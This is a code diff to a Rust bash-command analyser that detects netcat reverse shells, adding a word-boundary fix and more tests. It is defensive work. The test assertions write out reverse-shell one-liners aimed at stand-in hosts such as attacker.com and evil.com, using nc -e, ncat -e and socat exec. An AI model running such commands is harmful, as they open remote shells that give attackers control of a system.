@@ -928,14 +928,22 @@ fn check_reverse_shell(cmd_lower: &str) -> Option<String> {
     }
 
     // Netcat reverse shells: nc/ncat/netcat with -e or -c (execute)
+    // Use word-boundary check to avoid false positives on rsync/envsubst/grep -rnc, etc.
     let nc_tools = ["nc ", "ncat ", "netcat "];
     for tool in &nc_tools {
-        if cmd_lower.contains(tool) && (cmd_lower.contains(" -e ") || cmd_lower.contains(" -c ")) {
-            return Some(format!(
-                "Reverse shell: {}{} with -e/-c flag can execute commands on a remote connection",
-                &tool[..tool.len() - 1],
-                ""
-            ));
+        let mut search_from = 0;
+        while let Some(pos) = cmd_lower[search_from..].find(tool) {
+            let abs_pos = search_from + pos;
+            if is_at_word_boundary(cmd_lower, abs_pos)
+                && (cmd_lower.contains(" -e ") || cmd_lower.contains(" -c "))
+            {
+                return Some(format!(
+                    "Reverse shell: {}{} with -e/-c flag can execute commands on a remote connection",
+                    &tool[..tool.len() - 1],
+                    ""
+                ));
+            }
+            search_from = abs_pos + 1;
         }
     }
 
@@ -1494,10 +1502,18 @@ mod tests {
         // Netcat reverse shell
         assert!(analyze_bash_command("nc -e /bin/sh attacker.com 4444").is_some());
         assert!(analyze_bash_command("ncat -e /bin/bash evil.com 1234").is_some());
+        assert!(analyze_bash_command("ncat -c /bin/bash").is_some());
+        assert!(analyze_bash_command("netcat -e /bin/sh").is_some());
         // socat reverse shell
         assert!(analyze_bash_command("socat exec:'bash -i',pty tcp:attacker.com:4444").is_some());
         // Safe: normal nc usage (no -e/-c)
         assert!(analyze_bash_command("nc -zv localhost 8080").is_none());
+        // Safe: nc as listener only (no -e/-c execute flag)
+        assert!(analyze_bash_command("nc -l -p 8080").is_none());
+        // Safe: "nc" as substring of another command (word boundary prevents false positive)
+        assert!(analyze_bash_command("rsync -c /path/to/files").is_none());
+        assert!(analyze_bash_command("uncompress -c archive.gz").is_none());
+        assert!(analyze_bash_command("grep -rnc 'pattern' .").is_none());
     }
 
     #[test]
